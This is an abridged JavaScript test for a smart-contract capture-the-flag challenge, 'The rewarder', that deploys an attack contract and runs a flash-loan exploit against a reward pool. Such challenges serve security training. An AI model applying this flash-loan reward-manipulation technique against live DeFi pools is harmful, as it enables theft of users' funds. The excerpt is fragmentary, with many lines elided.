...
describe('[Challenge] The rewarder', function () {
  ...
  before(async function () {
    ...
    expect(
      await this.liquidityToken.balanceOf(attacker.address)
    ).to.eq('0');
  ...
  it('Exploit', async function () {
    ...
    const TheRewarderPoolAttackFactory =
      await ethers.getContractFactory(
        'TheRewarderPoolAttack',
        deployer
      );
    this.rewarderPoolAttack =
      await TheRewarderPoolAttackFactory.deploy(
    ...
    const rewarderPoolAttackWithAttacker =
      await this.rewarderPoolAttack.connect(attacker);

    await rewarderPoolAttackWithAttacker.getFlashLoan();

    await rewarderPoolAttackWithAttacker.withdrawRewardToken();
  });
  ...
  after(async function () {
    ...
    for (let i = 0; i < users.length; i++) {
      await this.rewarderPool.connect(users[i]).distributeRewards();
      let rewards = await this.rewardToken.balanceOf(
        users[i].address
      );
